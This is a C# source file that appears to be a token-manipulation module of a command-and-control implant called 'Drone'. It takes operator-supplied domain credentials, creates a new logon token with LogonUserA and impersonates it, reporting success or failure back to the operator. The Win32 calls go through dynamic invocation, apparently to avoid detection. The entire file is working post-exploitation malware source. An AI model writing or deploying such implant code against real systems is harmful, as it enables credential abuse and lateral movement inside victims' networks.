using System.Security.Principal;
using Drone.Models;

namespace TokenModule;

public partial class TokenModule
{
    private void MakeToken(DroneTask task, CancellationToken token)
    {
        var userDomain = task.Arguments[0].Split('\\');
            
        var domain = userDomain[0];
        var username = userDomain[1];
        var password = task.Arguments[1];
        
        var hToken = IntPtr.Zero;

        var success = Invocation.DynamicInvoke.Win32.Advapi32.LogonUserA(username, domain, password,
            Invocation.Data.Win32.Advapi32.LogonUserType.LOGON32_LOGON_NEW_CREDENTIALS,
            Invocation.Data.Win32.Advapi32.LogonUserProvider.LOGON32_PROVIDER_DEFAULT,
            ref hToken);

        if (!success)
        {
            Drone.SendError(task.TaskGuid, $"Failed to create token for {domain}\\{username}.");
            return;
        }
        
        success = Invocation.DynamicInvoke.Win32.Advapi32.ImpersonateLoggedOnUser(hToken);

        if (success)
        {
            using var identity = new WindowsIdentity(hToken);
            Drone.SendResult(task.TaskGuid, $"Created and impersonated token for {identity.Name}.");
        }
        else
        {
            Drone.SendError(task.TaskGuid, $"Failed to create token for {domain}\\{username}.");
        }
        
        Invocation.DynamicInvoke.Win32.Kernel32.CloseHandle(hToken);
    }
}